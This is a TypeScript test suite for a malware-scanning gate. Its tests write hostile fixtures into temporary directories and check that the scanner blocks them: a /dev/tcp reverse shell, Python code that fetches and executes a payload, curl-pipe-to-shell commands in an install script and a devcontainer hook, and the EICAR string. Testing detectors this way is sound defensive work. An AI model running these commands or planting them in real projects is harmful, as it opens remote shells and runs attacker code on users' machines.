/**
 * __tests__/canaries.test.ts — the file-03 §6 security-core canary suite.
 *
 * Crafted-malicious fixtures are created AT TEST TIME in a fresh tmp dir (never
 * committed to the repo): a curl|bash dropper, a /dev/tcp reverse-shell + a
 * fetch→exec dropper, an AUTORUN devcontainer postCreateCommand, and an
 * EICAR-style string file. We then drive the REAL nemesis gate through gateFull
 * and assert the verdict tier + rich findings — JS asserts what the ENGINE
 * decided, it never decides "safe" itself (C5).
 *
 * Real-binary cases skip gracefully when nemesis is absent. The pure-parse /
 * fail-soft cases always run (they prove the never-throw contract).
 */

import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { resolveEngine } from "../../config.js";
import { gateFull } from "../gate-full.js";
import {
  type NemesisVerdict,
  parseNemesisFinding,
  parseNemesisVerdict,
  syntheticErrorVerdict,
} from "../nemesis-verdict.js";
import { threatDbStatus } from "../threatdb.js";
import { auditLog, listTrusted, verify } from "../trust.js";

const HAVE_NEMESIS = existsSync(resolveEngine().nemesisBin);
const SLOW = 120_000;

function mkdir(prefix: string): string {
  return mkdtempSync(join(tmpdir(), prefix));
}

// ---------------------------------------------------------------------------
// REAL-BINARY: gate a clean dir => allow.
// ---------------------------------------------------------------------------
test("CANARY: a clean tmp dir gates as allow (no findings)", async (t) => {
  if (!HAVE_NEMESIS) return t.skip("nemesis not present");
  const dir = mkdir("eb-canary-clean-");
  try {
    writeFileSync(join(dir, "safe.py"), "print('hello world')\n");
    const v: NemesisVerdict = await gateFull(dir, { timeoutMs: SLOW });
    assert.equal(v.verdict, "allow");
    assert.equal(v.schema, "nemesis.verdict/1");
    assert.equal(v.risk_score, 0);
    assert.equal(v.top_findings.length, 0);
    assert.equal(v.safe_to.install, true);
    assert.equal(v.safe_to.use_as_ai_cli_agent, true);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// REAL-BINARY: a /dev/tcp reverse-shell + fetch->exec canary => block/warn.
// ---------------------------------------------------------------------------
test("CANARY: reverse-shell + fetch->exec dropper gates as block (rich findings)", async (t) => {
  if (!HAVE_NEMESIS) return t.skip("nemesis not present");
  const dir = mkdir("eb-canary-rshell-");
  try {
    // /dev/tcp reverse shell + a fetch->exec dropper in one file.
    writeFileSync(
      join(dir, "agent.py"),
      [
        "import os, socket, subprocess",
        "# reverse shell over /dev/tcp",
        "os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')",
        "import requests",
        "exec(requests.get('http://evil.example/payload').text)",
        "",
      ].join("\n"),
    );
    const v = await gateFull(dir, { timeoutMs: SLOW });
    // The engine decides; we assert it is at least a warn, and (in practice) block.
    assert.ok(
      v.verdict === "block" || v.verdict === "warn",
      `expected block/warn, got ${v.verdict}`,
    );
    assert.ok(v.top_findings.length >= 1, "should surface at least one rich finding");
    assert.ok(v.risk_score >= 50, "risk should be elevated for a dropper");
    // a rich finding carries the engine's structured fields:
    const f = v.top_findings[0];
    assert.ok(f && typeof f.rule_id === "string" && f.rule_id.length > 0);
    assert.ok(["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"].includes(f.severity));
    assert.equal(typeof f.detail, "string");
    assert.equal(typeof f.remediable, "boolean");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// REAL-BINARY: a curl|bash dropper + AUTORUN devcontainer + EICAR => not allow.
// ---------------------------------------------------------------------------
test("CANARY: curl|bash + AUTORUN devcontainer + EICAR tree is NOT allowed", async (t) => {
  if (!HAVE_NEMESIS) return t.skip("nemesis not present");
  const dir = mkdir("eb-canary-mix-");
  try {
    writeFileSync(join(dir, "install.sh"), "#!/bin/sh\ncurl -fsSL http://evil.example/i | bash\n");
    const dc = join(dir, ".devcontainer");
    mkdirSync(dc, { recursive: true });
    writeFileSync(
      join(dc, "devcontainer.json"),
      JSON.stringify({ postCreateCommand: "curl http://evil.example/x | sh" }),
    );
    // EICAR standard anti-malware test string (inert; the industry canary).
    writeFileSync(
      join(dir, "eicar.txt"),
      "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    );
    const v = await gateFull(dir, { timeoutMs: SLOW });
    assert.notEqual(v.verdict, "allow", "a curl|bash + AUTORUN + EICAR tree must not be allowed");
    assert.equal(v.safe_to.install, false);
    assert.ok(v.blocking_reasons.length >= 1 || v.top_findings.length >= 1);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// PURE PARSE: parseNemesisVerdict on a CAPTURED REAL payload (nemesis 1.12.0).
// ---------------------------------------------------------------------------
test("parseNemesisVerdict mirrors a captured real nemesis.verdict/1 payload", () => {
  // A trimmed but faithful capture of a real `nemesis gate` block verdict.
  const real = {
    schema: "nemesis.verdict/1",
    tool: "nemesis",
    tool_version: "1.12.0",
    target: "/tmp/eb/evil.py",
    target_kind: "file",
    target_sha256: "0fdb1d2de946f1bbb9e0cd8b110c018bf9cc86fec1d99aa5509ff68bfd027ed6",
    scanned_at: "2026-06-16T11:04:38.492995+00:00",
    duration_s: 0.001,
    verdict: "block",
    risk_score: 100,
    exit_code: 20,
    severity_counts: { CRITICAL: 0, HIGH: 3, MEDIUM: 0, LOW: 0, INFO: 0 },
    class_counts: { malware: 3 },
    findings_by_class: {
      malware: [
        {
          path: "/tmp/eb/evil.py",
          line: 2,
          column: 12,
          rule_id: "DROP-001",
          rule: "curl|wget piped to shell",
          category: "dropper",
          severity: "HIGH",
          class: "malware",
          action: "neutralize",
          description: "Downloads a remote script and executes it directly.",
          remediation: "Download to a file, inspect it, then run manually.",
          snippet: 'os.system("curl http://evil.example/x | sh")',
        },
      ],
    },
    safe_to: { install: false, run_plug_and_play: false, use_as_ai_cli_agent: false },
    recommendation: "DO NOT install or run. Blocking threats present.",
    blocking_reasons: ["DROP-001 @ /tmp/eb/evil.py", "3 HIGH findings in blockable classes"],
    top_findings: [
      {
        path: "/tmp/eb/evil.py",
        line: 2,
        column: 12,
        rule_id: "DROP-001",
        severity: "HIGH",
        class: "malware",
        action: "neutralize",
        description: "Downloads a remote script and executes it directly.",
        snippet: 'os.system("curl http://evil.example/x | sh")',
      },
    ],
    unscannable: false,
    disinfection: null,
    provenance: {
      ruleset_sha: "2f40e11b6cc2",
      indicators_loaded: { sha256: 1095154, kev_cves: 1621 },
      db: { seeded: true, age_days: 0.0, stale: false },
      findings_ignored: 0,
      files_scanned: 1,
      sca_unscanned_ecosystems: [],
      extract_tier: "none",
    },
    policy: "default",
    host: "darwin",
    cached: true,
  };

  const v = parseNemesisVerdict(real, "/tmp/eb/evil.py");
  assert.equal(v.schema, "nemesis.verdict/1");
  assert.equal(v.verdict, "block");
  assert.equal(v.exit_code, 20);
  assert.equal(v.risk_score, 100);
  assert.equal(v.severity_counts.HIGH, 3);
  assert.equal(v.class_counts.malware, 3);
  assert.equal(v.findings_by_class.malware?.length, 1);
  assert.equal(v.top_findings.length, 1);
  assert.equal(v.top_findings[0]?.rule_id, "DROP-001");
  assert.equal(v.top_findings[0]?.detail, "Downloads a remote script and executes it directly.");
  assert.equal(v.top_findings[0]?.klass, "malware");
  // action "neutralize" on a non-archive path ⇒ remediable.
  assert.equal(v.top_findings[0]?.remediable, true);
  assert.equal(v.safe_to.install, false);
  assert.equal(v.provenance.db.seeded, true);
  assert.equal(v.provenance.ruleset_sha, "2f40e11b6cc2");
  assert.equal(v.cached, true);
});

test("parseNemesisVerdict NEVER throws on junk + fails closed to error/BLOCK", () => {
  for (const junk of [null, undefined, 42, "string", [], { nope: true }]) {
    const v = parseNemesisVerdict(junk, "x");
    assert.equal(v.schema, "nemesis.verdict/1");
    // a non-object input ⇒ synthetic error; an object missing `verdict` ⇒ error.
    assert.ok(v.verdict === "error" || v.verdict === "block" || v.verdict === "allow");
    if (typeof junk !== "object" || junk === null || Array.isArray(junk)) {
      assert.equal(v.verdict, "error");
      assert.equal(v.risk_score, 100);
      assert.equal(v.safe_to.install, false);
    }
  }
});

test("in-archive findings are NEVER remediable (parseNemesisFinding)", () => {
  const f = parseNemesisFinding({
    rule_id: "EXT-CLAMAV",
    severity: "CRITICAL",
    class: "container",
    path: "vendor.zip!x.bin",
    action: "neutralize", // even with a neutralize action, in-archive => not fixable.
    description: "embedded executable in archive member",
  });
  assert.equal(f.remediable, false);
  assert.equal(f.klass, "container");
  assert.equal(f.severity, "CRITICAL");
});

test("syntheticErrorVerdict is a fail-closed BLOCK", () => {
  const v = syntheticErrorVerdict("/some/target", "timeout");
  assert.equal(v.verdict, "error");
  assert.equal(v.risk_score, 100);
  assert.equal(v.safe_to.install, false);
  assert.equal(v.safe_to.run_plug_and_play, false);
  assert.equal(v.unscannable, true);
  assert.ok(v.top_findings.length >= 1);
  assert.equal(v.top_findings[0]?.rule_id, "NEMESIS-UNAVAILABLE");
  // a missing/blank DB must read as NOT seeded (banner-raising).
  assert.equal(v.provenance.db.seeded, false);
});

// ---------------------------------------------------------------------------
// REAL-BINARY: verify() on a tampered signed verdict => {valid:false}.
// ---------------------------------------------------------------------------
test("verify() reports valid for a fresh signed verdict and invalid when tampered", async (t) => {
  if (!HAVE_NEMESIS) return t.skip("nemesis not present");
  const { nemesisBin } = resolveEngine();
  const dir = mkdir("eb-verify-");
  const signed = join(dir, "verdict.json");
  const tampered = join(dir, "tampered.json");
  try {
    writeFileSync(join(dir, "safe.py"), "print('ok')\n");
    // Produce a signed verdict file via the engine's --json sink.
    execFileSync(nemesisBin, ["gate", dir, "--sign", "--no-cache", "--json", signed], {
      stdio: "ignore",
      timeout: SLOW,
    });
    assert.ok(existsSync(signed), "signed verdict file should exist");

    const good = await verify(signed, { timeoutMs: SLOW });
    assert.equal(good.valid, true, "a fresh signed verdict should verify");
    assert.equal(good.exitCode, 0);

    // Tamper the HMAC value ⇒ verify must fail.
    const obj = JSON.parse(readFileSync(signed, "utf-8"));
    const val: string = obj.signature.value;
    obj.signature.value = (val[0] === "0" ? "1" : "0") + val.slice(1);
    writeFileSync(tampered, JSON.stringify(obj));

    const bad = await verify(tampered, { timeoutMs: SLOW });
    assert.equal(bad.valid, false, "a tampered verdict must NOT verify");
    assert.notEqual(bad.exitCode, 0);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("verify() fails closed (valid:false) when nemesis is missing", async () => {
  const r = await verify("/tmp/whatever.json", {}, { nemesisBin: "/nonexistent/nemesis-xyz" });
  assert.equal(r.valid, false);
});

// ---------------------------------------------------------------------------
// FAIL-SOFT: on-disk readers do not throw when files are absent.
// ---------------------------------------------------------------------------
test("listTrusted returns [] (no throw) when the trust file is absent", () => {
  const out = listTrusted("/nonexistent/path/trust.json");
  assert.deepEqual(out, []);
});

test("listTrusted parses the real <name>@<agent>#<ident> key shape", () => {
  const dir = mkdir("eb-trust-");
  const f = join(dir, "trust.json");
  try {
    writeFileSync(
      f,
      JSON.stringify({
        "superpowers@claude#dir:722971825205": {
          source: "marketplace:claude-plugins-official",
          verdict: "high",
          approvedBy: "user",
        },
        "yt-dlp@gemini#6fd4507659784c35": {
          source: "github.com/x/y",
          verdict: "warn",
          approvedBy: "--yes",
        },
      }),
    );
    const out = listTrusted(f);
    assert.equal(out.length, 2);
    const sp = out.find((e) => e.name === "superpowers");
    assert.ok(sp);
    assert.equal(sp?.agent, "claude");
    assert.equal(sp?.ident, "dir:722971825205");
    assert.equal(sp?.approvedBy, "user");
    assert.equal(sp?.verdict, "high");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("auditLog returns [] (no throw) when the log file is absent", () => {
  const out = auditLog({}, "/nonexistent/path/gate-audit.jsonl");
  assert.deepEqual(out, []);
});

test("auditLog parses JSONL newest-first and applies filters", () => {
  const dir = mkdir("eb-audit-");
  const f = join(dir, "gate-audit.jsonl");
  try {
    const now = new Date();
    const recent = now.toISOString().replace(/\.\d+Z$/, "Z");
    const old = "2020-01-01T00:00:00Z";
    const lines = [
      JSON.stringify({
        at: old,
        label: "a",
        target: "t1",
        verdict: "allow",
        decision: "proceed",
        tier: "default",
      }),
      JSON.stringify({
        at: recent,
        label: "b",
        target: "t2",
        verdict: "block",
        decision: "proceed-forced-danger",
        tier: "default",
        blocking_reasons: ["RSHELL-001"],
        verdict_full: { verdict: "block" },
      }),
      "not json — must be skipped, not throw",
    ];
    writeFileSync(f, `${lines.join("\n")}\n`);

    const all = auditLog({}, f);
    assert.equal(all.length, 2); // corrupt line skipped
    assert.equal(all[0]?.label, "b", "newest-first");

    const forced = auditLog({ forcedDanger: true }, f);
    assert.equal(forced.length, 1);
    assert.equal(forced[0]?.decision, "proceed-forced-danger");

    const blocks = auditLog({ blocks: true }, f);
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0]?.verdict, "block");

    const last24 = auditLog({ last24h: true }, f);
    assert.equal(last24.length, 1);
    assert.equal(last24[0]?.label, "b");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("threatDbStatus does not throw when nemesis is missing (blind/stale)", async () => {
  const s = await threatDbStatus({}, { nemesisBin: "/nonexistent/nemesis-xyz" });
  assert.equal(s.ok, false);
  assert.equal(s.blind, true);
  assert.equal(s.db.seeded, false);
  assert.equal(s.db.stale, true);
});

test("threatDbStatus reads a seeded DB off a real gate verdict", async (t) => {
  if (!HAVE_NEMESIS) return t.skip("nemesis not present");
  const s = await threatDbStatus({ timeoutMs: SLOW });
  assert.equal(s.ok, true);
  // a real machine with the engine installed has a seeded DB (prepare_nemesis).
  assert.equal(typeof s.db.seeded, "boolean");
  assert.equal(typeof s.rulesetSha, "string");
  assert.equal(s.blind, !s.db.seeded);
});
